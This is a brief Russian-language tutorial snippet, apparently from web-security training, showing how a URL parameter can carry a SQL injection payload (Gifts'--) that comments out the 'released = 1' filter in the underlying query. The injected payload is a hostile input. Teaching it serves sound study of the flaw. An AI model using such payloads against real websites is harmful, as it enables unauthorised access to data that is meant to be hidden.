У нас есть 

```
`https://insecure-website.com/products?category=Gifts
```

Мы можем попробовать прокинуть SQL через параметры, а именно:

```
https://insecure-website.com/products?category=Gifts'--
```

Под капотом запрос выглядел вот так:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
```

А стал:

```
`SELECT * FROM products WHERE category = 'Gifts'--- AND released = 1
```
